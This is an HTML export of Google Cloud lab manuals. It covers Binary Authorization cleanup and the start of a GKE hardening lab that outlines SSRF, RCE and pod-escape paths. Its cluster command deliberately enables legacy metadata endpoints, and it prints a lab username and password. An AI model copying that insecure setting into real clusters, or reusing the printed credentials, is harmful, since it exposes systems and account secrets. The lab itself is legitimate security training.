currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud container images delete "${IMAGE_PATH}@${IMAGE_DIGEST}" --force-delete-tags</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>If prompted, </span><code>Do you want to continue (Y/n)?</code><span> enter </span><code>Y</code><span>.</span></p></li><li><p><span>Delete the Attestor:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud --project="${PROJECT_ID}" \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  beta container binauthz attestors delete "${ATTESTOR}"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Delete the Container Analysis note:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -X DELETE \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  -H "Authorization: Bearer $(gcloud auth print-access-token)" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  "https://containeranalysis.googleapis.com/v1beta1/projects/${PROJECT_ID}/notes/${NOTE_ID}"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><h2 id='troubleshooting-in-your-own-environment'><span>Troubleshooting in your own environment</span></h2><ol start='' ><li><p><span>If you update the Binary Authorization policy and very quickly attempt to launch a new pod/container, the policy might not have time to take effect. You may need to wait 30 seconds or more for the policy change to become active. To retry, delete your pod using </span><code>kubectl delete &lt;podname&gt;</code><span> and resubmit the pod creation command.</span></p></li><li><p><span>Run </span><code>gcloud container clusters list</code><span> command to check the cluster status.</span></p></li><li><p><span>If you enable additional features like </span><code>--enable-network-policy</code><span>, </span><code>--accelerator</code><span>, </span><code>--enable-tpu</code><span>, or </span><code>--enable-metadata-concealment</code><span>, you may need to add additional registries to your Binary Authorization policy allowlist for those pods to be able to run. Use </span><code>kubectl describe pod &lt;podname&gt;</code><span> to find the registry path from the image specification and add it to the allowlist in the form of </span><code>gcr.io/example-registry/*</code><span> and save the policy.</span></p></li><li><p><span>If you get errors about quotas, please increase your quota in the project. Learn more about resource quotas from the </span><a href='https://cloud.google.com/compute/quotas'><span>Resource quotas documentation</span></a><span>.</span></p></li></ol><h2 id='relevant-materials'><span>Relevant materials</span></h2><ol start='' ><li><p><a href='https://cloud.google.com/compute/quotas'><span>Google Cloud Quotas</span></a></p></li><li><p><a href='https://cloud.google.com/'><span>Signup for Google Cloud</span></a></p></li><li><p><a href='https://cloud.google.com/shell/docs/'><span>Google Cloud Shell</span></a></p></li><li><p><a href='https://cloud.google.com/binary-authorization/'><span>Binary Authorization in GKE</span></a></p></li><li><p><a href='https://cloud.google.com/binary-authorization/docs/key-concepts#analysis_notes'><span>Container Analysis notes</span></a></p></li><li><p><a href='https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/'><span>Kubernetes Admission Controller</span></a></p></li><li><p><a href='https://cloud.google.com/terms/launch-stages'><span>Launch Stages</span></a></p></li></ol><h2 id='congratulations-29'><span>Congratulations!</span></h2><p><strong><span>Manual Last Updated October 4, 2024</span></strong></p><p><strong><span>Lab Last Tested April 4, 2024</span></strong></p><p><span>Copyright 2024 Google LLC. This software is provided as-is, without warranty or representation for any use or purpose. Your use of it is subject to your agreement with Google.</span></p><p>&nbsp;</p><h2 id='lab---hardening-default-gke-cluster-configurations'><span>LAB - Hardening Default GKE Cluster Configurations</span></h2><h2 id='overview-33'><span>Overview</span></h2><p><span>This lab demonstrates some of the security concerns of a default GKE cluster configuration and the corresponding hardening measures to prevent multiple paths of pod escape and cluster privilege escalation. These attack paths are relevant in the following scenarios:</span></p><ol start='' ><li><p><span>An application flaw in an external facing pod that allows for Server-Side Request Forgery (SSRF) attacks.</span></p></li><li><p><span>A fully compromised container inside a pod allowing for Remote Command Execution (RCE).</span></p></li><li><p><span>A malicious internal user or an attacker with a set of compromised internal user credentials with the ability to create/update a pod in a given namespace.</span></p></li></ol><p><span>This lab was created by GKE Helmsman engineers to help you grasp a better understanding of hardening default GKE cluster configurations.</span></p><p><em><span>The example code for this lab is provided as-is without warranty or guarantee</span></em></p><h3 id='objectives-22'><span>Objectives</span></h3><p><span>Upon completion of this lab you will understand the need for protecting the GKE Instance Metadata and defining appropriate PodSecurityPolicy policies for your environment.</span></p><p><span>You will:</span></p><ol start='' ><li><p><span>Create a small GKE cluster using the default settings.</span></p></li><li><p><span>Validate the most common paths of pod escape and cluster privilege escalation from the perspective of a malicious internal user.</span></p></li><li><p><span>Harden the GKE cluster for these issues.</span></p></li><li><p><span>Validate the cluster so that those actions are no longer allowed.</span></p></li></ol><h2 id='setup-and-requirements-30'><span>Setup and requirements</span></h2><h3 id='before-you-click-the-start-lab-button-16'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h3 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-11'><span>How to start your lab and sign in to the Google Cloud console</span></h3><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-02-e164b91bf60d@qwiklabs.net</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">7ZUIm6rpni18</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="https://cdn.qwiklabs.com/9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h3 id='activate-cloud-shell-6'><span>Activate Cloud Shell</span></h3><p><span>Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud. Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Activate Cloud Shell</span></strong><span> </span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span> at the top of the Google Cloud console.</span></p></li><li><p><span>Click through the following windows:</span></p><ul><li><p><span>Continue through the Cloud Shell information window.</span></p></li><li><p><span>Authorize Cloud Shell to use your credentials to make Google Cloud API calls.</span></p></li></ul></li></ol><p><span>When you are connected, you are already authenticated, and the project is set to your </span><strong><span>Project_ID</span></strong><span>, </span><code>qwiklabs-gcp-01-8af92117868a</code><span>. The output contains a line that declares the </span><strong><span>Project_ID</span></strong><span> for this session:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Your Cloud Platform project in this session is set to qwiklabs-gcp-01-8af92117868a</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><code>gcloud</code><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ol start='' ><li><p><span>(Optional) You can list the active account name with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACTIVE: *</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACCOUNT: student-02-e164b91bf60d@qwiklabs.net</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">To set the active account, run:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  $ gcloud config set account `ACCOUNT`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><ol start='' ><li><p><span>(Optional) You can list the project ID with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-01-8af92117868a</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> For full documentation of </span><code>gcloud</code><span>, in Google Cloud, refer to </span><a href='https://cloud.google.com/sdk/gcloud'><span>the gcloud CLI overview guide</span></a><span>.</span></p><h2 id='task-1-create-a-simple-gke-cluster'><span>Task 1. Create a simple GKE cluster</span></h2><ol start='' ><li><p><span>Set a zone into an environment variable called MY_ZONE. This lab is using &quot;</span><code>us-east1-b</code><span>&quot;, you can select a </span><a href='https://cloud.google.com/compute/docs/regions-zones/'><span>zone</span></a><span> if you prefer:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export MY_ZONE=us-east1-b</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run this to start a Kubernetes cluster managed by Kubernetes Engine named </span><code>simplecluster</code><span> and configure it to run 2 nodes:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud container clusters create simplecluster --zone $MY_ZONE --num-nodes 2 --metadata=disable-legacy-endpoints=false</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>It takes several minutes to create a cluster as Kubernetes Engine provisions virtual machines for you. The warnings about features available in new versions can be safely ignored for this lab.</span></p><ol start='' ><li><p><span>After the cluster is created, check your installed version of Kubernetes using the </span><code>kubectl version</code><span> command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div 